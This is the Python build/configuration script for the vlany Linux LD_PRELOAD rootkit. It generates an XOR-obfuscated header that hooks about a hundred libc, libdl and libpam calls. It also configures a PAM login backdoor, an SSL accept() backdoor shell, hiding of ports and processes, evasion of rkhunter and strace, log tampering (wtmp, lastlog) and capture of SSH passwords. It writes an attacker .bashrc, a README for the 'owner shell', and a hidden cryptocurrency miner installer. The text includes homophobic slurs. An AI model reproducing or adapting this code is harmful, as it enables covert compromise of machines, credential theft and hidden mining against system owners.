# -*- coding: utf-8 -*-
#!/usr/bin/python2

import sys
import random
import string
import crypt

if len(sys.argv) != 16:
    print "Why are you running me from the command line?"
    print "Usage: {0} <install> <lib name> <xattr 1> <xattr 2> <username> <plaintext password> <pam port> <ssl backdoor status> <accept shell password> <low> <high> <execve password> <environ var> <ptrace bug status>".format(sys.argv[0])
    quit()

MAGIC_GID = int(''.join(random.choice(string.digits[1:]) for x in range(9))) # string.digits[1:] because we don't want any zeros in the magic gid. fuck that

# I realize this is ugly fuuuck you
INSTALL = sys.argv[1]
LIB_LOCATION = sys.argv[2]
LIB_NAME = LIB_LOCATION.split("/")[-1].replace(".x86_64", "").replace(".i686", "").replace(".v6l", "")
HIDDEN_XATTR_1_STR = sys.argv[3]
HIDDEN_XATTR_2_STR = sys.argv[4]
VLANY_USER = sys.argv[5]
VLANY_PASSWORD = sys.argv[6]
PAM_PORT = int(float(sys.argv[7]))

SSL_BACKDOOR_STAT = int(float(sys.argv[8]))
if SSL_BACKDOOR_STAT == 0:
    SSL_BACKDOOR = False
elif SSL_BACKDOOR_STAT == 1:
    SSL_BACKDOOR = True
else:
    print "Value given for ssl backdoor status (sys.argv[8]) is invalid"
    quit()

SHELL_PASSWORD = sys.argv[9]
LOW_PORT = int(float(sys.argv[10]))
HIGH_PORT = int(float(sys.argv[11]))

EXECVE_PW = sys.argv[12].replace(" ", "").replace(";", "").replace("&", "")
ENV_VAR = sys.argv[13].replace(" ", "").replace(";", "").replace("&", "")

PTRACE_BUG_STAT = int(float(sys.argv[14]))
if PTRACE_BUG_STAT == 0:
    PTRACE_BUG = False
elif PTRACE_BUG_STAT == 1:
    PTRACE_BUG = True
else:
    print "Value given for ptrace bug status (sys.argv[14]) is invalid"
    quit()

PTRACE_BUG_MSG = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for x in range(50))
ACTIVATE_SWITCH = False
LD_PRELOAD = sys.argv[15]
PROC_NET_TCP = "/proc/net/tcp"
PROC_NET_TCP6 = "/proc/net/tcp6"
SSL_CIPHER_LIST = "ALL:!ADH:!LOW:!EXP:!MD5:@STRENGTH"

# each line has the names of 4 edited library function names..multiply this by the amount of lines and add on any stragglers
# amount of library functions being hooked = (4 * 22) + 3 = 91
CALLS = ["rename", "renameat", "renameat2", "fread",
         "stat", "stat64", "fstat", "fstat64",
         "lstat", "lstat64", "__lxstat", "__lxstat64",
         "__fxstat", "__fxstat64", "__xstat", "__xstat64",
         "fgets", "fgetflags", "fsetflags",
         "ptrace", "fwrite", "fwrite_unlocked", "fputs_unlocked",
         "execve", "execvp", "link", "linkat",
         "unlink", "unlinkat", "symlink", "symlinkat",
         "mkdir", "mkdirat", "rmdir", "opendir",
         "opendir64", "fdopendir", "readdir", "readdir64",
         "chdir", "fchdir", "access", "open",
         "open64", "fopen", "fopen64", "creat",
         "mkstemp", "accept", "setgid", "setregid",
         "setresgid", "pam_authenticate", "pam_open_session", "pam_acct_mgmt",
         "getpwnam_r", "getpwnam", "getspnam", "getpwuid",
         "kill", "chmod", "chown", "fchmod",
         "fchown", "fchownat", "lchown", "listxattr",
         "llistxattr", "flistxattr", "getxattr", "lgetxattr",
         "fgetxattr", "setxattr", "lsetxattr", "fsetxattr",
         "removexattr", "lremovexattr", "fremovexattr", "audit_log_acct_message",
         "audit_log_user_message", "audit_send", "getutent", "getutxent",
         "pututline", "pcap_loop", "getpwent", "syslog",
         "__syslog_chk", "dladdr", "dlinfo", "dlsym",
         "socket", "login", "setegid", "pututxline",
         "getutid", "getutxid", "getutmp", "getutmpx",
         "updwtmp", "updwtmpx"]

# the following three lists are just used to hide from dlsym()
# read symbols/hiding/libdl/dlsym.c for hiding functionality in relation to dlsym()
# should i accidentally miss out some hooked library symbols, vlany could be caught out by an admin. if this happens, just add whatever symbol(s) i missed out into this list and it's fixed :p
LIBC_CALLS = ["rename", "renameat", "renameat2", "fread",
             "stat", "stat64", "fstat", "fstat64",
             "lstat", "lstat64", "__lxstat", "__lxstat64",
             "__fxstat", "__fxstat64", "__xstat", "__xstat64",
             "ptrace", "fwrite", "fwrite_unlocked", "fputs_unlocked",
             "fgets", "fgetflags", "fsetflags", # i actually don't know if fgetflags or fsetflags are part of the c library, but i also don't know what library they are part of, so i'm assuming libc
             "execve", "execvp", "link", "linkat",
             "unlink", "unlinkat", "symlink", "symlinkat",
             "mkdir", "mkdirat", "rmdir", "opendir",
             "opendir64", "fdopendir", "readdir", "readdir64",
             "chdir", "fchdir", "access", "open",
             "open64", "fopen", "fopen64", "creat",
             "mkstemp", "accept", "setgid", "setregid",
             "setresgid", "getpwnam_r", "getpwnam", "getspnam",
             "getpwuid", "kill", "chmod", "chown",
             "fchmod", "fchown", "fchownat", "lchown",
             "listxattr", "llistxattr", "flistxattr", "getxattr",
             "lgetxattr", "fgetxattr", "setxattr", "lsetxattr",
             "fsetxattr", "removexattr", "lremovexattr", "fremovexattr",
             "getutent", "getutxent", "pututline", "getpwent",
             "syslog", "__syslog_chk", "socket", "login",
             "setegid", "pututxline", "getutid", "getutxid",
             "getutmp", "getutmpx", "updwtmp", "updwtmpx"] # return original address for all of these libc functions

LIBDL_CALLS = ["dladdr", "dlinfo", "dlsym"] # we also hook libdl stuff in order to hide modifications to library symbols, so we need to do the same here
LIBPAM_CALLS = ["pam_authenticate", "pam_open_session", "pam_acct_mgmt"] # and the same here...

# GAY_PROCS is a bit of a misnaming. this can also include environment variables :)
GAY_PROCS = ["unhide", "rkhunter", "chkproc", "ltrace", "strace", "LD_AUDIT"]

HIDDEN_INTERFACES = ["lxcbr0"]

# you should NEVER turn these on in a real life environment, they will cause the box to shit itself
DEBUG = False
PAM_DEBUG = False
VERBOSE_DEBUG = False

SHELL_MSG = """
\033[1m
       ______
          |             .
          |           __|___       ^'.           .-
          |  .          |         / \ '..----..'`/ \\
          |  |  . ,''   |         '  '   /      \  |
          |  |  | |     |         \ , `''         /
      ,   .  |  |  `.   |          /  ()    ()    `
       \  |  |  ;    |  |         /      _         \\
        '-'  `'` ,_,'   |  /     '      \_/         '
          .             '-'       `.    ,_        .`'.
  |     __|___.                     `-._/ \,   _.'\   `.
  |       | __|___                    _(__/        `...'^.
  |  ,'   |   |    o             |   /    `\          ,--.'
  ;,'   o |   |    |        .-,  |  |       `.  /    |     ".
  | \   | |   |    | | .-. /  |  |  \_| \_,   ''     '       `
  |  \  | |   |    | |/  | |  |  |    `-'\            `._     \\
  |   \ | |  /|    | |   | ;  |  |    '   '.             ' --.'
  |    `| '-' |  / ` |   |  `-|  |   /   '  `'--'       ,.    |
        `     '-'    |   `-'  |  o  /    |            .'      /
  ____________________________|_______________________________
                              |
                           \  |
                            '-'
\033[0m"""

HELP_MSG = """\033[1m// execve commands\033[0m
./help <pass>\n\t- show this message
./[un]hide <pass> <path>\n\t- dynamically hide or unhide a file
./apt <pass> <update/install/remove> <package name>\n\t- the only safe way of utilising Debian's package manager

\033[1m// .bashrc aliases\033[0m
\033[32munchattr\033[0m: removes all chattr permissions on default rootkit files in your hidden directory (allows them to be edited/removed)
\033[32mrechattr\033[0m: reinstates all chattr permissions on default rootkit files in your hidden directory (prevents them from being edited/removed)"""

def xor(str_):
    return ''.join(list('\\x'+hex(ord(x) ^ 0xac)[2:] for x in str_))

def cindex(call):
    return str(CALLS.index(call))

def const_h_setup():
    const_h = ""

    if DEBUG == True:
        const_h += "#define DEBUG\n"
    else:
        const_h += "#undef DEBUG\n"

    if VERBOSE_DEBUG == True:
        const_h += "#define VERBOSE_DEBUG\n"
    else:
        const_h += "#undef VERBOSE_DEBUG\n"

    if PAM_DEBUG == True:
        const_h += "#define PAM_DEBUG\n"
    else:
        const_h += "#undef PAM_DEBUG\n"

    if SSL_BACKDOOR == True:
        const_h += "#define SSL_BACKDOOR\n"
    else:
        const_h += "#undef SSL_BACKDOOR\n"

    if PTRACE_BUG == True:
        const_h += "#define PTRACE_BUG\n"
    else:
        const_h += "#undef PTRACE_BUG\n"

    const_h += '#define MAGIC_GID ' + str(MAGIC_GID) + '\n'

    const_h += '#define TERM_ENV_VAR "' + xor("TERM=xterm") + '"\n'

    const_h += '#define VLANY_USER "' + xor(VLANY_USER) + '"\n'
    const_h += '#define VLANY_PASSWORD "' + xor(crypt.crypt(VLANY_PASSWORD, "$6${0}".format(''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for x in range(12))))) + '"\n'
    const_h += '#define PAM_PORT ' + str(PAM_PORT) + '\n'
    const_h += '#define VLANY_PERM "' + xor("root") + '"\n'
    const_h += '#define HISTFILE "' + xor("/dev/null") + '"\n'
    const_h += '#define BASH_RC "' + xor(INSTALL + "/.bashrc") + '"\n'
    const_h += '#define SSH_PASSWORDS "' + xor(INSTALL + "/ssh_passwords") + '"\n'
    const_h += '#define LOG_FORMAT "' + xor("Username: %s\nPassword: %s\n\n") + '"\n'

    const_h += '#define SHELL_PASSWORD "' + xor(SHELL_PASSWORD) + '"\n'
    const_h += '#define SHELL_MSG "' + xor(HELP_MSG) + '"\n'
    const_h += '#define SHELL_NAME "' + xor("vlanyrk") + '"\n'
    const_h += '#define SHELL_TYPE "' + xor("/bin/bash") + '"\n'
    const_h += '#define LOGIN "' + xor("--login") + '"\n'

    const_h += '#define ENV_VAR "' + xor(ENV_VAR) + '"\n'
    const_h += '#define EXECVE_PW "' + xor(EXECVE_PW.replace(" ", "")) + '"\n'
    const_h += '#define TERM "' + xor("TERM=xterm") + '"\n'

    const_h += '#define LIB_NAME "' + xor(LIB_NAME) + '"\n'
    const_h += '#define PTRACE_BUG_MSG "' + xor(PTRACE_BUG_MSG) + '"\n'

    const_h += '#define HIDDEN_XATTR_1_STR "' + xor(HIDDEN_XATTR_1_STR) + '"\n'
    const_h += '#define HIDDEN_XATTR_2_STR "' + xor(HIDDEN_XATTR_2_STR) + '"\n'

    const_h += '#define APT "' + xor("apt") + '"\n'
    const_h += '#define APT_WARNING "' + xor("\033[1;31mTHIS FUNCTION ALLOWS YOU TO USE APT-GET WITHOUT FUCKING UP DPKG'S DB.\nTHE APT-GET PROCESS WILL BE COMPLETELY VISIBLE WHILE IT IS RUNNING.\nYOU ARE POTENTIALLY RISKING YOUR OBSCURITY WHILE YOU RUN THIS COMMAND.\nYOU HAVE BEEN WARNED. PRESS ENTER TO CONTINUE. OTHERWISE, ^C TO CANCEL.\n\033[0m") + '"\n'
    const_h += '#define APT_USAGE "' + xor("Usage: ./apt [pw] [update/install/remove] [package_name]\n") + '"\n'

    const_h += '#define APT_GID_SET "' + xor("SETTING GID TO 0\n") + '"\n'
    const_h += '#define APT_SUCCESS "' + xor("APT-GET FINISHED AND MAGIC_GID RESET. \033[1;32mYOU ARE HIDDEN AGAIN\033[0m.\n") + '"\n'

    const_h += '#define APT_UPDATE "' + xor("update") + '"\n'
    const_h += '#define APT_INSTALL "' + xor("install") + '"\n'
    const_h += '#define APT_REMOVE "' + xor("remove") + '"\n'

    const_h += '#define APT_UPDATE_CMD "' + xor("apt-get update") + '"\n'
    const_h += '#define APT_INSTALL_CMD "' + xor("apt-get --yes --force-yes install %s") + '"\n'
    const_h += '#define APT_REMOVE_CMD "' + xor("apt-get --yes --force-yes remove %s") + '"\n'

    const_h += '#define XATTR "' + xor("user.%s") + '"\n'

    const_h += '#define HIDE_FILE "' + xor("hide") + '"\n'
    const_h += '#define HIDE_USAGE "' + xor("The vlany function 'hide' requires a target path to hide in the second argument.\nUsage: ./hide <pass> <path>\n") + '"\n'
    const_h += '#define HIDE_SUCCESS "' + xor("\033[32m%s hidden.\033[0m\n") + '"\n'

    const_h += '#define UNHIDE_FILE "' + xor("unhide") + '"\n'
    const_h += '#define UNHIDE_USAGE "' + xor("The vlany function 'unhide' requires a target path to unhide in the second argument.\nUsage: ./unhide <pass> <path>\n") + '"\n'
    const_h += '#define UNHIDE_SUCCESS "' + xor("\033[32m%s unhidden.\033[0m\n") + '"\n'

    const_h += '#define LIBC_PATH "' + xor("libc.so.6") + '"\n'
    const_h += '#define LIBDL_PATH "' + xor("libdl.so.1") + '"\n'
    const_h += '#define LIBPAM_PATH "' + xor("libpam.so.0") + '"\n'

    const_h += '#define LD_LINUX_SO_PATH "' + xor("*/*ld-linux*.so.*") + '"\n'
    const_h += '#define LD_SO_PATH "' + xor("*/*ld-*.so") + '"\n'
    const_h += '#define LD_TRACE_ENV_VAR "' + xor("LD_TRACE_LOADED_OBJECTS=") + '"\n'
    const_h += '#define LD_DEBUG_ENV_VAR "' + xor("LD_DEBUG=") + '"\n'
    const_h += '#define LD_AUDIT_ENV_VAR "' + xor("LD_AUDIT=") + '"\n'
    const_h += '#define LD_AUDIT_GETENV "' + xor("LD_AUDIT") + '"\n'

    const_h += '#define HELP "' + xor("help") + '"\n'

    const_h += '#define LD_PRELOAD "' + xor(LD_PRELOAD) + '"\n'
    const_h += '#define LD_PRELOAD_ETC "' + xor(LD_PRELOAD.split("/")[-1]) + '"\n'
    const_h += '#define LD_PRELOAD_ENV "' + xor("LD_PRELOAD") + '"\n'

    const_h += '#define INSTALL "' + xor(INSTALL.split("/")[-1]) + '"\n'
    const_h += '#define INSTALL_DIR "' + xor(INSTALL) + '"\n'
    const_h += '#define LIB_LOCATION "' + xor(LIB_LOCATION) + '"\n'

    const_h += '#define PROC_NET_TCP "' + xor(PROC_NET_TCP) + '"\n'
    const_h += '#define PROC_NET_TCP6 "' + xor(PROC_NET_TCP6) + '"\n'
    const_h += '#define PROC_NET_STRING "' + xor(r"%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n") + '"\n'
    const_h += '#define PROC_PATH "' + xor("/proc/") + '"\n'
    const_h += '#define PROC_ID "' + xor("/proc/%s") + '"\n'

    const_h += '#define MAPS_PATH "' + xor("/proc/%d/maps") + '"\n'
    const_h += '#define FAKEMAPS_FILE "' + xor("/tmp/%d.fakemaps") + '"\n'

    const_h += '#define S_FSIZE 625824\n'

    const_h += '#define ENV_LINE "' + xor("%s/environ") + '"\n'
    const_h += '#define CMD_LINE "' + xor("%s/cmdline") + '"\n'
    const_h += '#define CMDLINE_SELF "' + xor("/proc/self/cmdline") + '"\n'
    const_h += '#define BASH "' + xor("/bin/bash --login") + '"\n'
    const_h += '#define _WTMP_FILE "' + xor("/var/log/wtmp") + '"\n'
    const_h += '#define _UTMP_FILE "' + xor("/var/run/utmp") + '"\n'
    const_h += '#define LASTLOG "' + xor("/var/log/lastlog") + '"\n'
    const_h += '#define FAKE_LASTLOG_FILE "' + xor("/tmp/.lastlog") + '"\n'

    const_h += '#define LOW_PORT ' + str(LOW_PORT) + '\n'
    const_h += '#define HIGH_PORT ' + str(HIGH_PORT) + '\n'

    const_h += '#define SSL_CIPHER_LIST "' + xor(SSL_CIPHER_LIST) + '"\n'
    const_h += '#define SUBJECT_ALT_NAME "' + xor("subjectAltName") + '"\n'
    const_h += '#define NS_COMMENT "' + xor("nsComment") + '"\n'
    const_h += '#define COMMON_NAME "' + xor("commonName") + '"\n'
    const_h += '#define COMMON_NAME_HOST "' + xor("localhost") + '"\n'
    const_h += '#define DNS "' + xor("DNS:") + '"\n'

    const_h += '#define DEFAULT_KEY_BITS 1024\n'
    const_h += '#define DEFAULT_CERT_DURATION 60 * 60 * 24 * 365\n'
    const_h += '#define CERTIFICATE_COMMENT "' + xor("auto") + '"\n'
    const_h += '#define DEFAULT_TCP_BUF_LEN (1024 * 8)\n'
    const_h += '#define MAX_LEN 4125\n'

    for x in CALLS:
        const_h += "#define C{0} {1}\n".format(x.upper(), cindex(x))

    const_h += '#define _CSIZE ' + str(len(CALLS))
    CALL_LIST = '\nstatic char *calls[_CSIZE] = {'
    for x in CALLS:
        CALL_LIST += '"{0}",'.format(xor(x))
    CALL_LIST = CALL_LIST[:-1] + "};\n"
    const_h += CALL_LIST

    const_h += '#define LIBC_SIZE ' + str(len(LIBC_CALLS))
    LIBC_CALL_LIST = '\nstatic char *libc_calls[LIBC_SIZE] = {'
    for x in LIBC_CALLS:
        LIBC_CALL_LIST += '"{0}",'.format(xor(x))
    LIBC_CALL_LIST = LIBC_CALL_LIST[:-1] + "};\n"
    const_h += LIBC_CALL_LIST

    const_h += '#define LIBDL_SIZE ' + str(len(LIBDL_CALLS))
    LIBDL_CALL_LIST = '\nstatic char *libdl_calls[LIBDL_SIZE] = {'
    for x in LIBDL_CALLS:
        LIBDL_CALL_LIST += '"{0}",'.format(xor(x))
    LIBDL_CALL_LIST = LIBDL_CALL_LIST[:-1] + "};\n"
    const_h += LIBDL_CALL_LIST

    const_h += '#define LIBPAM_SIZE ' + str(len(LIBPAM_CALLS))
    LIBPAM_CALL_LIST = '\nstatic char *libpam_calls[LIBPAM_SIZE] = {'
    for x in LIBPAM_CALLS:
        LIBPAM_CALL_LIST += '"{0}",'.format(xor(x))
    LIBPAM_CALL_LIST = LIBPAM_CALL_LIST[:-1] + "};\n"
    const_h += LIBPAM_CALL_LIST

    const_h += '#define GPSIZE ' + str(len(GAY_PROCS))
    GAY_PROCS_LIST = '\nstatic char *gay_procs_list[GPSIZE] = {'
    for x in GAY_PROCS:
        GAY_PROCS_LIST += '"{0}",'.format(xor(x))
    GAY_PROCS_LIST = GAY_PROCS_LIST[:-1] + "};\n"
    const_h += GAY_PROCS_LIST

    const_h += """int hidden_ports[] = {""" + str(PAM_PORT) + """,-1};\n"""

    const_h += '#define HOOK(old_sym, sym) if(!old_sym) old_sym = get_symbol(RTLD_NEXT, sym)\n'
    const_h += '#define CLEAN(var) cleanup(var, strlen(var))\n'

    open("symbols/headers/const.h", "w").write(const_h)

def bash_rc_setup():
    bash_rc = """if ! tty -s ; then return ; fi
unset HISTFILE SAVEHIST TMOUT PROMPT_COMMAND # WE'RE SUPPOSED TO BE INVISIBLE, DAN
if [ $(id -u) != 0 ]; then su root; fi
if [ $(id -u) != 0 ]; then kill -9 $$; fi
if [ -f "README" ]; then cat README | less; rm -f README; fi

clear
cat ~/.shell_msg

PROMPT_COMMAND='PS1="[\\033[1;31m\u@\h\\033[0m:\\033[1;34m\w\\033[0m]$ "'
printf "\\033[1m"; w; echo ""; cat ~/.vlany_information; printf "\\033[0m"

alias ls='ls --color=auto'
alias l=ls
alias ll='ls --color=auto -AlFhn'
alias rm='rm -rfv'
alias nano='nano -ELSiqt'
alias lsblk='lsblk --fs --all --paths --perms'

alias apt-get='printf "\\033[31mSee ./help for vlany function apt. (only works on Debian/Ubuntu)\\033[0m\\n"'
alias apt=apt-get
alias yum=apt-get
alias emerge=apt-get
alias pacman=apt-get

alias unchattr='cd {0}; chattr -ia .* * &>/dev/null; echo "chattr permissions removed on rootkit files"'
alias rechattr='cd {0}; chattr +ia .* * &>/dev/null; echo "rootkit files chattr permissions reinstated"'

echo -e "\\033[1mLogged login attempts: \\033[1;32m$(grep Username ~/ssh_passwords | wc -l)\\033[0m"
"""
    fd = open("bashrc", "w")
    fd.write(bash_rc.format(INSTALL))
    fd.close()

    fd = open("shell_msg", "w")
    fd.write(SHELL_MSG)
    fd.close()

    BD_README = """
██╗   ██╗██╗      █████╗ ███╗   ██╗██╗   ██╗
██║   ██║██║     ██╔══██╗████╗  ██║╚██╗ ██╔╝
██║   ██║██║     ███████║██╔██╗ ██║ ╚████╔╝
╚██╗ ██╔╝██║     ██╔══██║██║╚██╗██║  ╚██╔╝
 ╚████╔╝ ███████╗██║  ██║██║ ╚████║   ██║
  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝
        (rootkit for homosexuals)

If you're reading this, then you've successfully logged into your PAM backdoor and you are in an owner shell. Now that you've started reading this, there's a few things you should know.
vlany is now a public rootkit! Thanks for using me, it means a lot. Enjoy, and try not to get caught. :p
By default, vlany attempts to prevent you from unhiding yourself to a certain extent, but you can easily get past that, since you ARE in an owner shell after all. Be careful if you're going to do something potentially dumb.
DO NOT unalias apt-get and attempt to install a package via the standard package manager on this box. EVERYTHING WILL GO TO RUIN.
There's a vlany command for installing packages via apt-get. To use it, enter "./apt" followed by your execve password.
(The switch from GID based file hiding to extended attributes fixed this, but package managers still will not work. Nothing will be ruined, but package managers will not work.)
That brings me on to my next point. You should've set a password for the execve commands when you installed vlany. To access them, run "./help" followed by the password you set. Voilà.

BIG GAY WARNING:
    WHEN RUNNING THE APT-GET PROCESS, THE PROCESS WILL BE _UNHIDDEN_. MAKING ANY USER ABLE TO VIEW THE PROCESS FROM PS.
    FOR THIS REASON, IT IS ONLY POSSIBLE TO INSTALL ONE PACKAGE AT A TIME. TRY NOT TO INSTALL PACKAGES THAT WILL TAKE MORE THAN 1 MINUTE TO INSTALL.
    BE CAREFUL.
    YOU HAVE BEEN WARNED.
    THIS APPLIES FOR ANY PROCESSES WHICH TEMPORARILY CHANGE YOUR GID.

A breakdown of how the command works:
    cd to root
    set gid root
    use apt-get without FUCKING everything up
    set gid back to original gid & rehide
    cd back to previous directory
Using this, you can also create your own scripts to do the same thing for other package managers such as emerge (Gentoo) or yum (Fedora).

Rootkit shared object file:
    This is located in your hidden directory. DO NOT remove it. If you do, ld will throw a shit bunch of errors your way. That's bad.
    By default, install.sh makes the shared object file unremovable. If you run 'unchattr', you'll be able to remove it.

File hiding/protection:
    FILES OR DIRECTORIES CREATED IN THIS SHELL AREN'T HIDDEN DYNAMICALLY DUE TO THE NEW FILE HIDING BY EXTENDED ATTRIBUTES.
    ONCE YOU CREATE NEW FILES OR DIRECTORIES, YOU MUST ISSUE THE ./hide COMMAND ON THE NEWLY CREATED FILES/DIRECTORIES TO
    PROTECT THEM FROM REGULAR USERS. THIS IS VERY IMPORTANT. DO NOT FORGET THIS.

vlany LXC container:
  There's a file called enter_lxc.c in your home directory. It allows for on-the-fly creation and destruction of hidden container environments.
  Since you'll be running the binary from a hidden owner shell, the file system and any log files pertaining to the hidden container will be completely hidden from regular users.
  THIS NOW DOES NOT APPLY AS OF June 2nd 2016, SINCE VLANY USES EXTENDED ATTRIBUTES TO HIDE FILES NOW. FILE HIDING VIA EXTENDED ATTRIBUTES ISN'T DYNAMIC IN THE SAME WAY THAT GID BASED
  FILE HIDING IS.
  To compile this utility, make sure you have the lxc header files installed, usually in a package called lxc-dev or something similar. Once you've verified this, use gcc and remember
  to link liblxc when compiling.
  The binary takes one argument - a container name - to run.
  Literal usage:
    gcc enter_lxc.c -llxc -o enter_lxc
    ./enter_lxc VLANY_CONTAINER
  Remember that this container is temporary and will be destroyed once you type 'exit'.
  If somebody (not you) is monitoring disk usage of this box, they will notice that the disk usage will increase when you're in a container. The disk usage will go back to normal once you
  exit the container. It's not like this will get us caught, but it might look a little strange to some paranoid admins.

Bitcoin/Litecoin miner:
  There's a Python script in your hidden directory called "minerd_setup.py". Running it will setup your miner and compile a binary called "minerd_bin".
  The zip file stored in your hidden directory called "cpuminer-master" is extracted upon running the minerd_setup script. There is no need to manually unzip it.
  The process of compiling minerd will be _UNHIDDEN_ from other regular users on the box. As soon as the compilation has finished, you will be hidden again.
  Since you're starting the binary from your hidden owner shell, the minerd process itself will be hidden.
  List of Ubuntu/Debian packages required to compile the miner (there are equivalents for these packages for other package managers):
      git (as of 23/10/2016, git is no longer required to set up the miner), libcurl4-openssl-dev, libncurses5-dev, pkg-config, automake, yasm
  TRYING TO SETUP YOUR MINER WITHOUT THESE PACKAGES INSTALLED WILL FUCK UP THE SETUP PROCESS. DON'T BE RETARDED.
  Once you've compiled the miner, start it with ./minerd_bin --url=minerpool.org --user=username --pass=password

Read this AT LEAST twice, when you're done, quit this screen by pressing q. This screen will not show again after this."""

    fd = open("bd_readme", "w")
    fd.write(BD_README)
    fd.close()

    MINERD_SCRIPT = """#!/usr/bin/env python
import ctypes,os
libc=ctypes.CDLL("libc.so.6")
libc.chdir("/")
libc.setgid(0)
os.system('cp ~/cpuminer-master.zip /cpuminer-master.zip;unzip cpuminer-master.zip;cd cpuminer;./autogen.sh;./configure CFLAGS="-O3";make')
libc.setgid(""" + str(MAGIC_GID) + """)
os.system('mv /cpuminer/minerd ~/minerd_bin;rm -rf /cpuminer/ /cpuminer-master.zip;')"""

    fd = open("minerd_setup.py", "w")
    fd.write(MINERD_SCRIPT)
    fd.close()

def main():
    const_h_setup()
    bash_rc_setup()
    sys.stdout.write("success")

if __name__ == "__main__":
    main()
